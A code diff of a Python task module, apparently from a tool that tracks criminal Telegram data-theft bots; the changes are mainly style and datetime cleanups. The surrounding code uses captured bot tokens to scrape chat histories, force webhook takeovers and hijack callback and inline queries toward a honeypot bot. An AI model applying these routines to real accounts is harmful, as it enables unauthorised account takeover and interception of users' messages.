@@ -1,20 +1,23 @@
 import asyncio
+import contextlib
+import logging
 import os
 import random
 import time
 from collections import defaultdict
-from typing import Any, Dict, List
+from datetime import UTC
+from typing import Any
 
 import httpx
-from app.workers.celery_app import app
+import redis
+from celery.exceptions import SoftTimeLimitExceeded
+
+from app.core.audit import AuditEvent, AuditLogger
+from app.core.config import settings
 from app.core.database import db
 from app.core.security import security
 from app.services.scraper_srv import scraper_service
-import redis
-from app.core.config import settings
-import logging
-from celery.exceptions import SoftTimeLimitExceeded
-from app.core.audit import AuditEvent, AuditLogger
+from app.workers.celery_app import app
 
 logger = logging.getLogger("flow.tasks")
 
@@ -42,7 +45,7 @@ async def _send_alert(message: str) -> None:
         logger.debug(f"[TelemetryParser] Alert dispatch skipped: {e}")
 
 
-def _is_high_priority_indicator(indicator: Dict[str, Any]) -> bool:
+def _is_high_priority_indicator(indicator: dict[str, Any]) -> bool:
     indicator_type = indicator.get("indicator_type")
     indicator_value = str(indicator.get("indicator_value") or "").lower()
     if indicator_type == "wallet_address":
@@ -52,11 +55,11 @@ def _is_high_priority_indicator(indicator: Dict[str, Any]) -> bool:
     return any(keyword in indicator_value for keyword in HIGH_PRIORITY_DOMAIN_KEYWORDS)
 
 
-async def _hydrate_message_rows_for_index(message_rows: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+async def _hydrate_message_rows_for_index(message_rows: list[dict[str, Any]]) -> list[dict[str, Any]]:
     """Ensure rows have the exfiltrated_messages UUID needed by telemetry_indicators."""
-    hydrated: List[Dict[str, Any]] = []
-    missing_by_credential: Dict[str, List[int]] = defaultdict(list)
-    source_by_key: Dict[tuple[str, int], Dict[str, Any]] = {}
+    hydrated: list[dict[str, Any]] = []
+    missing_by_credential: dict[str, list[int]] = defaultdict(list)
+    source_by_key: dict[tuple[str, int], dict[str, Any]] = {}
 
     for row in message_rows:
         credential_id = row.get("credential_id")
@@ -96,7 +99,7 @@ async def _hydrate_message_rows_for_index(message_rows: List[Dict[str, Any]]) ->
     return hydrated
 
 
-async def _index_telemetry_indicators(message_rows: List[Dict[str, Any]]) -> int:
+async def _index_telemetry_indicators(message_rows: list[dict[str, Any]]) -> int:
     """Best-effort structured indicator indexing for newly inserted messages."""
     if not message_rows:
         return 0
@@ -105,7 +108,7 @@ async def _index_telemetry_indicators(message_rows: List[Dict[str, Any]]) -> int
         from app.services.telemetry_parser import TelemetryEntityParser
 
         message_rows = await _hydrate_message_rows_for_index(message_rows)
-        indicator_rows: List[Dict[str, Any]] = []
+        indicator_rows: list[dict[str, Any]] = []
         for row in message_rows:
             message_id = row.get("id")
             credential_id = row.get("credential_id")
@@ -162,7 +165,7 @@ async def _index_telemetry_indicators(message_rows: List[Dict[str, Any]]) -> int
         return 0
 
 
-async def _merge_credential_meta(cred_id: str, patch: Dict[str, Any]) -> Dict[str, Any]:
+async def _merge_credential_meta(cred_id: str, patch: dict[str, Any]) -> dict[str, Any]:
     """Merge a metadata patch without overwriting unrelated enrichment keys."""
     fresh_meta_res = await async_execute(
         db.table("discovered_credentials").select("meta").eq("id", cred_id).single()
@@ -234,7 +237,7 @@ async def _fetch_bot_capabilities(
 
     return capabilities
 
-def _strategy_attempt_to_dict(attempt: Any) -> Dict[str, Any]:
+def _strategy_attempt_to_dict(attempt: Any) -> dict[str, Any]:
     if hasattr(attempt, "to_dict"):
         return attempt.to_dict()
     if isinstance(attempt, dict):
@@ -250,7 +253,7 @@ def _strategy_attempt_to_dict(attempt: Any) -> Dict[str, Any]:
 
 
 async def _persist_scrape_classification(cred_id: str, scrape_result: Any) -> None:
-    from datetime import datetime, timezone
+    from datetime import datetime
 
     if hasattr(scrape_result, "to_metadata"):
         meta_patch = scrape_result.to_metadata()
@@ -263,7 +266,7 @@ async def _persist_scrape_classification(cred_id: str, scrape_result: Any) -> No
             "last_scrape_next_action": "persist_messages" if scrape_result else "no_action",
         }
 
-    meta_patch["last_scrape_at"] = datetime.now(timezone.utc).isoformat()
+    meta_patch["last_scrape_at"] = datetime.now(UTC).isoformat()
     await _merge_credential_meta(cred_id, meta_patch)
 
     reason = meta_patch.get("last_scrape_reason")
@@ -352,7 +355,7 @@ def _set_broadcast_reliability_columns_available(value: bool) -> None:
     _BROADCAST_RELIABILITY_LAST_CHECK = time.time()
 
 
-async def _fetch_pending_broadcast_messages(batch_size: int, now_iso: str) -> List[Dict[str, Any]]:
+async def _fetch_pending_broadcast_messages(batch_size: int, now_iso: str) -> list[dict[str, Any]]:
     base_query = (
         db.table("exfiltrated_messages")
         .select("*, discovered_credentials!inner(meta)")
@@ -390,9 +393,9 @@ async def _fetch_pending_broadcast_messages(batch_size: int, now_iso: str) -> Li
 
 
 async def _update_message_broadcast_success(msg_id: str) -> None:
-    from datetime import datetime, timezone
+    from datetime import datetime
 
-    now_iso = datetime.now(timezone.utc).isoformat()
+    now_iso = datetime.now(UTC).isoformat()
     payload = {
         "is_broadcasted": True,
         "broadcast_claimed_at": None,
@@ -448,15 +451,15 @@ async def _update_message_broadcast_success(msg_id: str) -> None:
             raise
 
 
-async def _mark_broadcast_failure(msg: Dict[str, Any], exc: BaseException) -> None:
-    from datetime import datetime, timedelta, timezone
+async def _mark_broadcast_failure(msg: dict[str, Any], exc: BaseException) -> None:
+    from datetime import datetime, timedelta
 
     msg_id = msg["id"]
     reason = getattr(exc, "reason", exc.__class__.__name__)
     retryable = bool(getattr(exc, "retryable", True))
     detail = getattr(exc, "detail", str(exc)) or reason
     retry_after_seconds = getattr(exc, "retry_after_seconds", None)
-    now = datetime.now(timezone.utc)
+    now = datetime.now(UTC)
     attempts = int(msg.get("broadcast_attempts") or 0) + 1
     delay_seconds = _broadcast_retry_delay_seconds(reason, retryable, retry_after_seconds)
     next_retry_at = (now + timedelta(seconds=delay_seconds)).isoformat()
@@ -575,21 +578,21 @@ async def _exfiltrate_logic(cred_id: str):
     await broadcaster.send_log(f"🕵️ Starting exfiltration for CredID: `{cred_id}`")
 
     # T010: Observability hook
-    from app.core.metrics import metrics
     from app.core.audit import AuditLogger
+    from app.core.metrics import metrics
     metrics.inc("exfiltrate.started")
     AuditLogger.log(
         event_type="exfiltrate.start",
         credential_id=cred_id,
         details={"cred_id": cred_id}
     )
-    
+
     # Fetch credential
     response = await async_execute(db.table("discovered_credentials").select("bot_token, chat_id, meta").eq("id", cred_id))
     if not response.data:
         logger.error(f"❌ [Exfil] Credential {cred_id} not found in DB.")
         return f"Credential {cred_id} not found."
-    
+
     record = response.data[0]
     encrypted_token = record["bot_token"]
     chat_id = record["chat_id"]
@@ -665,11 +668,11 @@ async def _exfiltrate_logic(cred_id: str):
     try:
         logger.info(f"⏳ [Exfil] Calling scraper service for chat {chat_id}...")
         await broadcaster.send_log(f"⏳ Scraping chat `{chat_id}`...")
-        
+
         scrape_result = await scraper_service.scrape_history(bot_token, chat_id)
         await _persist_scrape_classification(cred_id, scrape_result)
         messages = list(getattr(scrape_result, "messages", scrape_result))
-        
+
         logger.info(f"✅ [Exfil] Scraper returned {len(messages)} messages.")
         reason = getattr(scrape_result, "reason_code", "success" if messages else "no_new_messages")
         await broadcaster.send_log(f"✅ Scraped {len(messages)} messages (`{reason}`).")
@@ -715,16 +718,16 @@ async def _exfiltrate_logic(cred_id: str):
 
     # Save Messages (using UPSERT to prevent duplicates)
     new_count = 0
-    index_candidates: List[Dict[str, Any]] = []
+    index_candidates: list[dict[str, Any]] = []
     for msg in messages:
         msg["credential_id"] = cred_id
-        
+
         # SANITIZE: Remove keys that don't exist in the 'exfiltrated_messages' table
         # ScraperService adds 'chat_id' for context, but DB doesn't have it.
         db_payload = msg.copy()
         if "chat_id" in db_payload:
             del db_payload["chat_id"]
-            
+
         try:
             # Use upsert: insert if not exists, ignore if duplicate
             result = await async_execute(db.table("exfiltrated_messages").upsert(
@@ -732,7 +735,7 @@ async def _exfiltrate_logic(cred_id: str):
                 on_conflict="credential_id,telegram_msg_id",  # Conflict columns
                 ignore_duplicates=True  # Don't update existing, just skip
             ))
-            
+
             if result.data:
                 new_count += 1
                 index_candidates.extend(result.data)
@@ -768,8 +771,8 @@ async def _enrich_logic(cred_id: str):
     logger.info(f"✨ [Enrich] Starting enrichment for credential {cred_id}")
 
     # T010: Observability hook
-    from app.core.metrics import metrics
     from app.core.audit import AuditLogger
+    from app.core.metrics import metrics
     metrics.inc("enrich.started")
     AuditLogger.log(
         event_type="enrich.start",
@@ -784,9 +787,9 @@ async def _enrich_logic(cred_id: str):
     if not response.data:
         logger.error(f"❌ [Enrich] Credential {cred_id} not found.")
         return f"Credential {cred_id} not found."
-    
+
     record = response.data[0]
-    
+
     # Decrypt or Handle Legacy/Raw
     try:
         if not record["bot_token"].startswith("gAAAA"):
@@ -850,11 +853,11 @@ async def _enrich_logic(cred_id: str):
 
     first_chat = chats[0]
     logger.info(f"📝 [Enrich] Updating credential with Primary Chat: {first_chat['name']} (ID: {first_chat['id']})")
-    
+
     # Update primary
     # Pre-create Topic with NEW FORMAT: @username / botid
     from app.core.config import settings
-    
+
     bot_username = bot_info.get("username") or ""
     bot_id = bot_info.get("id") or ""
 
@@ -877,7 +880,7 @@ async def _enrich_logic(cred_id: str):
         chat_id=first_chat["id"] if real_chats else None,
     )
     topic_name = f"@{bot_username} / {bot_id}"
-    
+
     topic_id = 0
     try:
         topic_id = await broadcaster.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
@@ -907,11 +910,12 @@ async def _enrich_logic(cred_id: str):
 
     # Fire webhook alert (fire-and-forget — never blocks enrich)
     try:
+        from datetime import datetime
+
         from app.core.webhook import dispatch_alert as _dispatch_alert
-        from datetime import datetime, timezone as _tz
         await _dispatch_alert({
             "event": "credential_activated",
-            "timestamp": datetime.now(_tz.utc).isoformat(),
+            "timestamp": datetime.now(UTC).isoformat(),
             "credential_id": cred_id,
             "bot_username": bot_username,
             "bot_id": str(bot_id),
@@ -921,7 +925,7 @@ async def _enrich_logic(cred_id: str):
         })
     except Exception as _wh_exc:
         logger.debug(f"[Webhook] dispatch_alert failed: {_wh_exc}")
-    
+
     # Trigger Exfiltration for Primary
     logger.info(f"🚀 [Enrich] Triggering exfiltration for {cred_id}...")
     await broadcaster.send_log("🚀 Triggering background exfiltration task.")
@@ -1037,13 +1041,13 @@ async def _broadcast_logic():
     if not settings.ENABLE_RAW_MESSAGE_BROADCAST:
         return "Disabled: raw message broadcast is opt-in; use the findings queue."
 
-    from datetime import datetime, timezone, timedelta
+    from datetime import datetime, timedelta
 
     broadcaster = get_broadcaster()
 
     from app.core.constants import CLAIM_TIMEOUT_MINUTES
-    stale_threshold = datetime.now(timezone.utc) - timedelta(minutes=CLAIM_TIMEOUT_MINUTES)
-    now_iso = datetime.now(timezone.utc).isoformat()
+    stale_threshold = datetime.now(UTC) - timedelta(minutes=CLAIM_TIMEOUT_MINUTES)
+    now_iso = datetime.now(UTC).isoformat()
 
     # Batch size: env-configurable. Default 200 (200 × 1.5s = 300s per run,
     # fits inside CLAIM_TIMEOUT_MINUTES=15 with headroom).
@@ -1052,9 +1056,9 @@ async def _broadcast_logic():
     BROADCAST_BATCH_SIZE = int(os.getenv("BROADCAST_BATCH_SIZE", 200))
     messages = await _fetch_pending_broadcast_messages(BROADCAST_BATCH_SIZE, now_iso)
     if not messages:
-        # Only log periodically or if verbose debug needed? 
+        # Only log periodically or if verbose debug needed?
         # For now, let's log it to confirm the task is running.
-        logger.info("💤 No pending broadcasts found.") 
+        logger.info("💤 No pending broadcasts found.")
         return "No pending broadcasts."
 
     group_id = settings.MONITOR_GROUP_ID
@@ -1066,14 +1070,14 @@ async def _broadcast_logic():
 
     for msg in messages:
         msg_id = msg["id"]
-        
+
         try:
             # ==========================================================
             # STEP 1: ATOMIC CLAIM via DB (works across ALL environments)
             # ==========================================================
             # Single conditional UPDATE — only succeeds if message is unclaimed and not yet broadcast.
             # This eliminates the TOCTOU race between check and claim.
-            claim_time = datetime.now(timezone.utc).isoformat()
+            claim_time = datetime.now(UTC).isoformat()
 
             # Attempt to claim an unclaimed message
             claim_result = await async_execute(db.table("exfiltrated_messages")\
@@ -1100,14 +1104,14 @@ async def _broadcast_logic():
                     continue
 
                 logger.warning(f"    🔄 Stale claim reclaimed for {msg_id}")
-            
+
             logger.info(f"    📌 Claimed message {msg_id}")
-            
+
             cred_id = msg["credential_id"]
             # Extract meta from the joined discovered_credentials
             cred_info = msg.get("discovered_credentials", {})
             meta = cred_info.get("meta", {}) if cred_info else {}
-            
+
             # 1. Resolve Topic Name (Always needed for potential recreation)
             # Priority: @username / botid -> chat_name -> Cred-ID
             bot_username = meta.get("bot_username")
@@ -1201,10 +1205,10 @@ async def _broadcast_logic():
                 meta["topic_id"] = thread_id
                 await async_execute(db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id))
                 logger.info(f"    📝 [Broadcast] Saved topic_id {thread_id} for {cred_id}")
-            
+
             # Update local cache
             cached_topic_ids[cred_id] = thread_id
-            
+
             # Send Message (with retry for deleted topics)
             send_success = False
             try:
@@ -1238,7 +1242,7 @@ async def _broadcast_logic():
                 else:
                     logger.error(f"    ❌ Send failed: {e}")
                     await _mark_broadcast_failure(msg, e)
-            
+
             if send_success:
                 # ==============================================
                 # SUCCESS: Mark as broadcasted and clear claim
@@ -1248,9 +1252,9 @@ async def _broadcast_logic():
                 logger.info(f"    ✅ Broadcasted msg {msg_id}")
             else:
                 logger.warning(f"    🔄 Broadcast failure recorded for retry: {msg_id}")
-            
+
             # Rate limit
-            await asyncio.sleep(2.0) 
+            await asyncio.sleep(2.0)
 
         except Exception as e:
             logger.error(f"Error broadcasting msg {msg_id}: {e}")
@@ -1259,7 +1263,7 @@ async def _broadcast_logic():
             except Exception as e_claim:
                 logger.error(f"Failed to clear broadcast claim for msg {msg_id}: {e_claim} — message may be stuck until stale-claim TTL expires")
             continue
-    
+
     result = f"Broadcasted {sent_count}/{len(messages)} messages"
     if skipped_count > 0:
         result += f" (skipped {skipped_count} claimed by other workers)"
@@ -1392,8 +1396,8 @@ def close_revoked_topics(
     force: bool = False,
 ):
     """Close Telegram forum topics for revoked credentials."""
-    from app.workers.celery_app import get_worker_loop
     from app.services.topic_admin_srv import close_revoked_topics_logic
+    from app.workers.celery_app import get_worker_loop
 
     return get_worker_loop().run_until_complete(
         close_revoked_topics_logic(
@@ -1415,7 +1419,7 @@ def canary_flow_check():
 
 
 async def _canary_flow_check_logic():
-    from datetime import datetime, timezone
+    from datetime import datetime
 
     cred_id = settings.CANARY_CREDENTIAL_ID
     if not cred_id:
@@ -1426,7 +1430,7 @@ async def _canary_flow_check_logic():
             "reason": "raw message broadcast is intentionally disabled by policy",
         }
 
-    now = datetime.now(timezone.utc)
+    now = datetime.now(UTC)
     telegram_msg_id = -int(time.time())
     content = f"{settings.CANARY_EXPECTED_TEXT} {now.isoformat()}"
     row = {
@@ -1588,11 +1592,11 @@ async def _probe_webhook_url(url: str) -> dict:
     """
     import socket
     import ssl
-    from datetime import datetime, timezone
+    from datetime import datetime
     from urllib.parse import urlparse
 
     result: dict[str, Any] = {
-        "probed_at": datetime.now(timezone.utc).isoformat(),
+        "probed_at": datetime.now(UTC).isoformat(),
         "url": url,
     }
     try:
@@ -1725,10 +1729,8 @@ async def _probe_webhook_url(url: str) -> dict:
                         result["tls_san"] = sorted({n.value for n in san_ext})
                     except x509.ExtensionNotFound:
                         pass
-                    try:
+                    with contextlib.suppress(Exception):
                         result["tls_fingerprint_sha256"] = cert.fingerprint(hashes.SHA256()).hex()
-                    except Exception:
-                        pass
             except Exception as tls_exc:
                 result["tls_error"] = f"{type(tls_exc).__name__}: {str(tls_exc)[:150]}"
 
@@ -1948,9 +1950,9 @@ def probe_webhooks(max_per_run: int = 50, force: bool = False):
 
 
 async def _probe_webhooks_logic(max_per_run: int, force: bool = False) -> dict:
-    from datetime import datetime, timedelta, timezone
+    from datetime import datetime, timedelta
 
-    now = datetime.now(timezone.utc)
+    now = datetime.now(UTC)
     stale_cutoff = (now - timedelta(hours=_WEBHOOK_PROBE_STALE_HOURS)).isoformat()
 
     # Fetch a bounded slice — population of bots with webhook is small.
@@ -2152,14 +2154,12 @@ async def _pin_webhook_url_logic(
         try:
             topic_id = await broadcaster.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
             new_meta = {**meta, "topic_id": topic_id}
-            try:
+            with contextlib.suppress(Exception):
                 await async_execute(
                     db.table("discovered_credentials")
                     .update({"meta": new_meta})
                     .eq("id", credential_id)
                 )
-            except Exception:
-                pass
         except Exception as topic_exc:
             return {"status": "topic_create_failed", "error": str(topic_exc)[:200]}
 
@@ -2167,7 +2167,7 @@ async def _pin_webhook_url_logic(
         return {"status": "no_topic"}
 
     # Compose the pin — plain text, no Markdown parse (URL may contain unbalanced chars)
-    header = f"🔗 Captured webhook URL (before takeover)"
+    header = "🔗 Captured webhook URL (before takeover)"
     lines = [header, "", webhook_url, ""]
     if bot_username or bot_id:
         lines.append(f"Bot: @{bot_username or '?'} ({bot_id or '?'})")
@@ -2214,7 +2214,7 @@ async def _pin_webhook_url_logic(
     for k, v in (evidence or {}).items():
         if k in ("delete_policy", "webhook_url"):
             continue
-        if isinstance(v, (str, int, float, bool)) or v is None:
+        if isinstance(v, str | int | float | bool) or v is None:
             lines.append(f"- {k}: {v}")
     msg = "\n".join(lines)[:3900]
 
@@ -2228,13 +2228,13 @@ async def _pin_webhook_url_logic(
     # in-topic is enough; pinning creates clutter. Meta still records
     # posted_webhook_msg_id for reference but doesn't imply pinned state.
     try:
-        from datetime import datetime, timezone
+        from datetime import datetime
 
         new_meta = {
             **meta,
             "topic_id": topic_id,
             "posted_webhook_msg_id": sent_msg_id,
-            "posted_webhook_at": datetime.now(timezone.utc).isoformat(),
+            "posted_webhook_at": datetime.now(UTC).isoformat(),
         }
         await async_execute(
             db.table("discovered_credentials")
@@ -2290,12 +2290,10 @@ async def _force_webhook_takeover_logic(max_credentials: int) -> dict:
             break
 
     logger.info(f"[ForceTakeover] enqueued {len(queued)} credentials for immediate rescrape")
-    try:
+    with contextlib.suppress(Exception):
         await get_broadcaster().send_log(
             f"⚡ Force takeover pass — enqueued {len(queued)} webhook-registered bots for immediate rescrape"
         )
-    except Exception:
-        pass
 
     return {"status": "ok", "queued": len(queued)}
 
@@ -2410,9 +2408,9 @@ def takeover_spike_check():
 
 
 async def _takeover_spike_check_logic() -> dict:
-    from datetime import datetime, timedelta, timezone
+    from datetime import datetime, timedelta
 
-    cutoff = datetime.now(timezone.utc) - timedelta(seconds=TAKEOVER_SPIKE_WINDOW_SECONDS)
+    cutoff = datetime.now(UTC) - timedelta(seconds=TAKEOVER_SPIKE_WINDOW_SECONDS)
     cutoff_iso = cutoff.isoformat()
 
     try:
@@ -2467,7 +2465,7 @@ def exfil_latency_report():
 
 async def _exfil_latency_report_logic() -> dict:
     import statistics
-    from datetime import datetime, timezone
+    from datetime import datetime
 
     # Attempt the true-latency query first (requires broadcasted_at column).
     true_latency_mode = True
@@ -2499,7 +2497,7 @@ async def _exfil_latency_report_logic() -> dict:
     if not rows:
         return {"status": "no_data", "sample_size": 0}
 
-    now = datetime.now(timezone.utc)
+    now = datetime.now(UTC)
     latencies: list[float] = []
     broadcasted = 0
     pending = 0
@@ -2512,7 +2510,7 @@ async def _exfil_latency_report_logic() -> dict:
         except (ValueError, TypeError):
             return None
         if dt.tzinfo is None:
-            dt = dt.replace(tzinfo=timezone.utc)
+            dt = dt.replace(tzinfo=UTC)
         return dt
 
     for row in rows:
@@ -2614,6 +2612,7 @@ def reclassify_dark_matter(max_credentials: int = 500):
 
 async def _reclassify_dark_matter_logic(max_credentials: int) -> dict:
     import httpx
+
     from app.core.security import security
 
     try:
@@ -2652,29 +2651,23 @@ async def _reclassify_dark_matter_logic(max_credentials: int) -> dict:
 
     # Apply updates in batches
     for cred_id in to_active:
-        try:
+        with contextlib.suppress(Exception):
             await async_execute(
                 db.table("discovered_credentials")
                 .update({"status": "active"})
                 .eq("id", cred_id)
             )
-        except Exception:
-            pass
     for cred_id in to_revoke:
-        try:
+        with contextlib.suppress(Exception):
             await _mark_credential_revoked(cred_id, "dark_matter_reclassify")
-        except Exception:
-            pass
 
     msg = (
         f"🔄 Dark-matter reclassify — inspected {inspected}, "
         f"reactivated {len(to_active)}, revoked {len(to_revoke)}"
     )
     logger.info(msg)
-    try:
+    with contextlib.suppress(Exception):
         await get_broadcaster().send_log(msg)
-    except Exception:
-        pass
 
     return {
         "status": "ok",
@@ -2870,7 +2863,6 @@ def cluster_c2_operators():
 async def _cluster_c2_operators_logic() -> dict:
     from collections import defaultdict
     from urllib.parse import urlparse
-    import re
 
     try:
         res = await async_execute(
@@ -3053,8 +3045,9 @@ async def _hash_exfil_media_logic(max_messages: int) -> dict:
         try:
             if media_type == "photo":
                 from io import BytesIO
-                from PIL import Image
+
                 import imagehash
+                from PIL import Image
 
                 img = Image.open(BytesIO(data))
                 phash = str(imagehash.phash(img))
@@ -3135,12 +3128,10 @@ async def _media_duplicate_report_logic() -> dict:
     duplicates.sort(key=lambda x: x[1], reverse=True)
 
     if not duplicates:
-        try:
+        with contextlib.suppress(Exception):
             await get_broadcaster().send_log(
                 "🔎 **Media Duplicate Report** — no shared media across bots yet."
             )
-        except Exception:
-            pass
         return {"status": "no_duplicates"}
 
     lines = [
@@ -3219,10 +3210,8 @@ async def _unpin_all_webhook_messages_logic(max_credentials: int) -> dict:
 
     msg = f"📌 Unpinned {unpinned} webhook messages ({failed} unpin failures)"
     logger.info(msg)
-    try:
+    with contextlib.suppress(Exception):
         await broadcaster.send_log(msg)
-    except Exception:
-        pass
 
     return {"status": "ok", "unpinned": unpinned, "failed": failed, "total": len(rows)}
 
@@ -3354,9 +3343,9 @@ def message_flow_diag():
 
 async def _message_flow_diag_logic() -> dict:
     from collections import Counter
-    from datetime import datetime, timedelta, timezone
+    from datetime import datetime, timedelta
 
-    now = datetime.now(timezone.utc)
+    now = datetime.now(UTC)
     windows = [
         ("last 1h", now - timedelta(hours=1)),
         ("last 24h", now - timedelta(hours=24)),
@@ -3511,10 +3500,8 @@ async def _reconcile_topics_from_db_logic(max_credentials: int) -> dict:
             "🔄 **Topic Reconciliation** — DB clean. "
             "0 messages pending broadcast across all credentials."
         )
-        try:
+        with contextlib.suppress(Exception):
             await get_broadcaster().send_log(msg)
-        except Exception:
-            pass
         return {"status": "clean", "pending": 0}
 
     # 2. Which credentials need topic verification? Look at ones with pending msgs.
@@ -3584,7 +3571,7 @@ def pin_general_readme():
 
 
 async def _pin_general_readme_logic() -> dict:
-    from datetime import datetime, timezone
+    from datetime import datetime
 
     webapp_url = "https://theprawnhunter.hong-yi.me"
     readme = (
@@ -3613,7 +3600,7 @@ async def _pin_general_readme_logic() -> dict:
         "**Admin commands** (whitelisted users only):\n"
         "`/status` `/pause` `/resume` `/bots` `/starthunter` `/help`\n"
         "\n"
-        f"_Last updated: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}_"
+        f"_Last updated: {datetime.now(UTC).strftime('%Y-%m-%d %H:%M UTC')}_"
     )
 
     broadcaster = get_broadcaster()
@@ -3628,10 +3615,8 @@ async def _pin_general_readme_logic() -> dict:
         )
         if prev.data:
             prev_id = int(prev.data[0]["value"])
-            try:
+            with contextlib.suppress(Exception):
                 await broadcaster.unpin_message(settings.MONITOR_GROUP_ID, prev_id)
-            except Exception:
-                pass
     except Exception:
         # system_state table might not exist yet — that's fine
         pass
@@ -3721,7 +3706,7 @@ async def _audit_user_agent_group_membership_logic() -> dict:
     marked_inactive: list[str] = []
     missing_user_id: list[str] = []
 
-    from datetime import datetime, timezone
+    from datetime import datetime
 
     async with httpx.AsyncClient(timeout=15.0) as client:
         for acct in accounts:
@@ -3747,7 +3732,7 @@ async def _audit_user_agent_group_membership_logic() -> dict:
                                 .update({
                                     "status": "inactive",
                                     "in_monitor_group": False,
-                                    "last_membership_check_at": datetime.now(timezone.utc).isoformat(),
+                                    "last_membership_check_at": datetime.now(UTC).isoformat(),
                                 })
                                 .eq("id", acct["id"])
                             )
@@ -3762,18 +3747,16 @@ async def _audit_user_agent_group_membership_logic() -> dict:
                     # accounts and any human you manually promoted with wider rights.
                     if member_status in ("creator", "administrator"):
                         already_promoted += 1
-                        try:
+                        with contextlib.suppress(Exception):
                             await async_execute(
                                 db.table("telegram_accounts")
                                 .update({
                                     "is_admin_promoted": True,
                                     "in_monitor_group": True,
-                                    "last_membership_check_at": datetime.now(timezone.utc).isoformat(),
+                                    "last_membership_check_at": datetime.now(UTC).isoformat(),
                                 })
                                 .eq("id", acct["id"])
                             )
-                        except Exception:
-                            pass
                         continue
 
                     # If in group but not promoted, promote now
@@ -3796,32 +3779,28 @@ async def _audit_user_agent_group_membership_logic() -> dict:
                         )
                         if promote_resp.status_code == 200 and (promote_resp.json() or {}).get("ok"):
                             promoted_now += 1
-                            try:
+                            with contextlib.suppress(Exception):
                                 await async_execute(
                                     db.table("telegram_accounts")
                                     .update({
                                         "is_admin_promoted": True,
-                                        "promoted_at": datetime.now(timezone.utc).isoformat(),
+                                        "promoted_at": datetime.now(UTC).isoformat(),
                                         "in_monitor_group": True,
-                                        "last_membership_check_at": datetime.now(timezone.utc).isoformat(),
+                                        "last_membership_check_at": datetime.now(UTC).isoformat(),
                                     })
                                     .eq("id", acct["id"])
                                 )
-                            except Exception:
-                                pass
                     else:
                         already_promoted += 1
-                        try:
+                        with contextlib.suppress(Exception):
                             await async_execute(
                                 db.table("telegram_accounts")
                                 .update({
                                     "in_monitor_group": True,
-                                    "last_membership_check_at": datetime.now(timezone.utc).isoformat(),
+                                    "last_membership_check_at": datetime.now(UTC).isoformat(),
                                 })
                                 .eq("id", acct["id"])
                             )
-                        except Exception:
-                            pass
                 else:
                     logger.debug(
                         "[MembershipAudit] getChatMember returned HTTP %s for "
@@ -3882,6 +3861,7 @@ def attribution_graph_report():
 
 async def _attribution_graph_report_logic() -> dict:
     from collections import defaultdict
+
     from app.services.findings import (
         cross_bot_pattern_candidates,
         persist_candidates,
@@ -3932,10 +3912,8 @@ async def _attribution_graph_report_logic() -> dict:
             "No users found interacting with 2+ captured bots yet. "
             "Graph will populate as new sender_user_id data flows in."
         )
-        try:
+        with contextlib.suppress(Exception):
             await get_broadcaster().send_log(msg)
-        except Exception:
-            pass
         return {
             "status": "no_multi_bot_users",
             "total_messages_scanned": len(rows),
@@ -4054,7 +4032,7 @@ async def _honeypot_redirect_sweep_logic() -> dict:
         payload = row.get("payload") or {}
         credential_id = row.get("credential_id")
         update_type = row.get("update_type") or "message"
-        
+
         # Extract user_id and chat_id based on update_type
         user_id = None
         chat_id = None
@@ -4099,14 +4077,12 @@ async def _honeypot_redirect_sweep_logic() -> dict:
         try:
             from app.core.redis_srv import redis_srv
             if redis_srv.client.exists(dedup_key):
-                try:
+                with contextlib.suppress(Exception):
                     await async_execute(
                         db.table("honeypot_updates")
                         .update({"redirected_at": "now()", "redirected_bot": "dedup_skip"})
                         .eq("id", row["id"])
                     )
-                except Exception:
-                    pass
                 skipped += 1
                 continue
         except Exception:
@@ -4151,10 +4127,12 @@ async def _honeypot_redirect_one_logic(
     chat_id: int,
     update_type: str = "message",
 ) -> dict:
+    from datetime import datetime
+
     import httpx
-    from datetime import datetime, timezone
+
     from app.workers.tasks.honeypot_redirect_strategies import HoneypotRedirectStrategies
-    
+
     redirect_bot = settings.HONEYPOT_REDIRECT_BOT
     deeplink = settings.HONEYPOT_REDIRECT_DEEPLINK
     redirect_url = f"https://t.me/{redirect_bot}?start={deeplink}"
@@ -4168,29 +4146,29 @@ async def _honeypot_redirect_one_logic(
         )
         if not payload.data:
             return {"status": "payload_not_found"}
-        
+
         cb = payload.data[0].get("payload", {}).get("callback_query", {})
         callback_id = cb.get("id")
-        
+
         bot_token = await HoneypotRedirectStrategies.get_bot_token(credential_id)
         if not bot_token:
             return {"status": "token_decrypt_failed"}
-        
+
         sent_ok = await HoneypotRedirectStrategies.send_callback_hijack(
             bot_token, callback_id, redirect_url, redirect_bot
         )
-        
+
         if sent_ok:
             await HoneypotRedirectStrategies.update_redirect_record(
                 update_id, user_id, redirect_bot
             )
             HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
-        
+
         logger.info(
             f"🔀 [Callback] hijacked cred:{credential_id[:8]}... sent={sent_ok}"
         )
         return {"status": "callback_handled", "sent": sent_ok}
-    
+
     # Level 4: Inline query hijack
     elif update_type == "inline_query":
         payload = await async_execute(
@@ -4201,25 +4179,25 @@ async def _honeypot_redirect_one_logic(
         )
         if not payload.data:
             return {"status": "payload_not_found"}
-        
+
         iq = payload.data[0].get("payload", {}).get("inline_query", {})
         inline_id = iq.get("id")
         query_text = iq.get("query", "")
-        
+
         bot_token = await HoneypotRedirectStrategies.get_bot_token(credential_id)
         if not bot_token:
             return {"status": "token_decrypt_failed"}
-        
+
         sent_ok = await HoneypotRedirectStrategies.send_inline_hijack(
             bot_token, inline_id, query_text, redirect_url, redirect_bot
         )
-        
+
         if sent_ok:
             await HoneypotRedirectStrategies.update_redirect_record(
                 update_id, user_id, redirect_bot
             )
             HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
-        
+
         logger.info(
             f"🔀 [Inline] hijacked cred:{credential_id[:8]}... sent={sent_ok}"
         )
@@ -4238,14 +4216,12 @@ async def _honeypot_redirect_one_logic(
         bot_token = security.decrypt(cred.data[0]["bot_token"]).strip()
     except Exception as e:
         # Mark the row with error
-        try:
+        with contextlib.suppress(Exception):
             await async_execute(
                 db.table("honeypot_updates")
                 .update({"redirect_error": f"token_decrypt: {str(e)[:100]}"})
                 .eq("id", update_id)
             )
-        except Exception:
-            pass
         return {"status": "token_decrypt_failed", "error": str(e)[:200]}
 
